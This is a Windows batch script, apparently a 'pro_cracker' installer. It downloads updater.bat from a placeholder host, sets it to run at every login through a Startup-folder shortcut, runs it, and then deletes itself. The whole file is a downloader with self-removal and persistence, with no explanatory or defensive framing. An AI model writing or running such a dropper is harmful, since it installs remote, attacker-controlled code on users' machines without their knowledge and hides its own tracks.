@echo off
md "%APPDATA%\pro_cracker"
powershell -command "Invoke-WebRequest -Uri 'http://your-website.com/updater.bat' -OutFile '%APPDATA%\pro_cracker\updater.bat'"
powershell -command "$s=(New-Object -COM WScript.Shell).CreateShortcut('%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\updater.lnk');$s.TargetPath='%APPDATA%\pro_cracker\updater.bat';$s.Save()"
call "%APPDATA%\pro_cracker\updater.bat"
del "%~f0"
